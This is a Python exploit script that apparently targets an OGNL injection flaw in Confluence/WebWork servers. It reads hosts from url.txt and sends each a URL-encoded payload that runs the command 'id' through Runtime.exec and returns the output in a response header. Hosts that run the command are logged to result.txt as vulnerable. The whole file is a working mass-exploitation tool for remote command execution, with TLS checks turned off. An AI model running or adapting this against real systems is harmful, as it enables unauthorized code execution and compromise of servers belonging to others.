import requests
import urllib3
urllib3.disable_warnings()

def payload(host):
    command = 'id'
    response = requests.get("{}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22{}%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/".format(host, command), verify=False, allow_redirects=False)
    if(response.status_code == 302):
        return response.headers['X-Cmd-Response']
        print('存在漏洞')
    else:
        print('不存在漏洞')
        return False

def save(data):
    with open('result.txt', 'a') as f:
        f.write(data + "\n")

data = open('url.txt','r').readlines()
for i in data:
    try:
        host = i.strip()
        print(host)
        expcmd = payload(host)
        if expcmd:
            print(expcmd)
            save(host)
    except Exception as e:
        print(e)
        continue
